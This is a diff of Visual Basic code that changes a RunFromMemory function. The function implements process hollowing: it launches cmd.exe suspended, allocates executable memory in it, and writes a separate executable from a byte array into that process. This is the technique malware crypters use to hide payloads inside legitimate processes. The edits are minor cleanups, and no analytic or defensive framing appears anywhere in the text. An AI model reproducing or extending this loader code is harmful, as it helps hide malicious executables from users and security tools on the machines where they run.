@@ -138,7 +138,7 @@ End Type
 '
 Private Type IMAGE_DATA_DIRECTORY
     VirtualAddress As Long
-    size As Long
+    Size As Long
 End Type
 
 '
@@ -228,7 +228,7 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
         Exit Function
     End If
     
-    If CreateProcess(vbNullString, GetCurrentEXEPath("cmd.exe") & " " & Arguments, 0, 0, InheritHandles, CREATE_SUSPENDED Or CreationFlags, EnvironmentVariables, CurrentDir, si, pi) = 0 Then
+    If CreateProcess(vbNullString, "cmd.exe " & Arguments, 0, 0, InheritHandles, CREATE_SUSPENDED Or CreationFlags, EnvironmentVariables, CurrentDir, si, pi) = 0 Then
         RunFromMemory = 0&
         Exit Function
     End If
@@ -244,7 +244,7 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
     ImageBase = VirtualAllocEx(pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     If ImageBase = 0 Then
         ImageBase = VirtualAllocEx(pi.hProcess, 0&, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-        If ImageBase = 0 Then MsgBox 1: GoTo ClearProcess
+        If ImageBase = 0 Then GoTo ClearProcess
     End If
     
     WriteProcessMemory pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, 0&
